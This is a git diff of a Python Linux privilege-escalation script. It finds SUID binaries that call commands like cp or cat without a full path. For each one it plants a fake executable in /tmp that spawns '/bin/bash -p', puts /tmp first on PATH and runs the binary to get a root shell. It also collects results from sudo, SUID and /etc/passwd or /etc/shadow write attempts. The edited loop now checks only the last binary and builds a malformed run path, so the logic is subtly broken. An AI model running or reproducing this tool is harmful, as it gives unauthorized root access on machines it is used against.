@@ -386,26 +386,28 @@ def path():
    "git", "gh", "vi", "nano"]
 
    os.system("mkdir /tmp/.path/")
-   os.system("echo '### possible undefined $PATH binary vulnerabilities ###' > /tmp/path_res.txt")
+   os.system("echo '### the following are possible undefined $PATH binary vulnerabilities ###' > /tmp/path_res.txt")
    os.system("find / -type f -perm /4000 2>/dev/null > /tmp/path.txt")
    print("\n### finding SUID executables that don't specify full path (for $PATH exploit) ###")
    with open("/tmp/path.txt") as root_files:
       lines = root_files.readlines()
       for line in lines:
+         line_path = line
          split_path = line.split("/")
          split_path_1 = split_path[-1].strip()
-         os.system("strings {} > /tmp/.path/root_{} &".format(line,split_path_1))
-         with open("/tmp/.path/root_{}".format(split_path_1)) as strings_file:
-            lines_strings = strings_file.readlines()
-            for cmd in common_cmds:
-               non_path_cmd = re.search("\s{}\s".format(cmd), str(lines_strings))
-               if non_path_cmd:
-                  print("### {} does not specify full path of {} ###".format(line,cmd))
-                  os.system("echo '### {} does not specify full path of {} ###' >> /tmp/path_res.txt".format(line,cmd))
-                  os.system("touch /tmp/{}&&echo '/bin/bash -p' > /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line))
-                  break
-               else:
-                  continue
+         os.system("strings {} > /tmp/.path/root_{}".format(line,split_path_1))
+   with open("/tmp/.path/root_{}".format(split_path_1)) as strings_file:
+      lines_strings = strings_file.readlines()
+      for line in lines_strings:
+         for cmd in common_cmds:
+            non_path_cmd = re.search("\s{}\s".format(cmd), str(line))
+            if non_path_cmd:
+               print("### {} binary does not specify full path of {} ###".format(split_path_1,cmd))
+               os.system("echo '### {} does not specify full path of {} ###' >> /tmp/path_res.txt".format(split_path_1,cmd))
+               os.system("touch /tmp/{}&&echo '/bin/bash -p' > /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line_path))
+               break
+            else:
+               continue
 
 
 # try writing to /etc/passwd or /etc/shadow
@@ -447,18 +449,18 @@ def pass_shadow(username,password):
 
    # print results to screen
    os.system("touch /tmp/print.txt")
-   os.system("echo ''")
-   os.system("echo ''")
-   os.system("echo ''")
+   os.system("echo ' '")
+   os.system("echo ' '")
+   os.system("echo ' '")
    os.system("echo '### Privilege Escalation Results ###' > /tmp/print.txt")
-   os.system("echo '' >> /tmp/print.txt")
-   os.system("cat /tmp/esc.txt >> /tmp/sudo_l.txt")
-   os.system("cat /tmp/sudo_l.txt >> /tmp/print.txt")
-   os.system("cat /tmp/suid_esc.txt >> /tmp/suid.txt")
-   os.system("cat /tmp/suid.txt >> /tmp/print.txt")
-   os.system("cat /tmp/path_res.txt >> /tmp/print.txt")
-   os.system("cat /tmp/passwd_res.txt >> /tmp/print.txt")
-   os.system("cat /tmp/shad_res.txt >> /tmp/print.txt")
+   os.system("echo ' ' >> /tmp/print.txt")
+   os.system("cat /tmp/esc.txt >> /tmp/sudo_l.txt 2>/dev/null")
+   os.system("cat /tmp/sudo_l.txt >> /tmp/print.txt 2>/dev/null")
+   os.system("cat /tmp/suid_esc.txt >> /tmp/suid.txt 2>/dev/null")
+   os.system("cat /tmp/suid.txt >> /tmp/print.txt 2>/dev/null")
+   os.system("cat /tmp/path_res.txt >> /tmp/print.txt 2>/dev/null")
+   os.system("cat /tmp/passwd_res.txt >> /tmp/print.txt 2>/dev/null")
+   os.system("cat /tmp/shad_res.txt >> /tmp/print.txt 2>/dev/null")
    os.system("cat /tmp/print.txt")
 
 
